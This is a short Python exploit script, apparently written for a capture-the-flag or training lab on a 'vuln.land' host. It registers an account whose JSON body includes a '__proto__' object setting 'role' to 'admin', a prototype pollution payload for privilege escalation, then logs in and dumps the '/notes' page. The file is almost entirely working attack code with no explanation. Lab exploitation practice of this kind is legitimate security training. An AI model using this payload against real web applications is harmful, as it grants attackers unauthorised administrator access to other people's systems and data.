#!/usr/bin/python3

from requests import post, get
from requests_html import HTMLSession
import string
import random

session = HTMLSession()

url = "https://402d661d-9794-4840-b3da-e4522fca74e2.idocker.vuln.land/"

name = "jadu" + random.choice(string.printable) + random.choice(string.printable) 

payload = { "username": name,
			"password": "jadu",
			"__proto__": { 
							"role": "admin"
						}
		}

login = {"username":name, "password":"jadu"}

r = session.post(url + "api/register", json=payload)
#print(r.text)
#exit(-2)

if r.status_code == 400:
	print(r.text)
	#print("Try with diff username")
	exit(-1)
else:
	r = session.post(url + "api/login", json=login)
	#print(r.text)
	#header, cookie = r.headers["Set-Cookie"].split(";")[0].split("=")[1], r.headers["Set-Cookie"].split(";")[0].split("=")[1]
	#print(cookie)
	r = session.get(url + "notes")
	print(r.text)
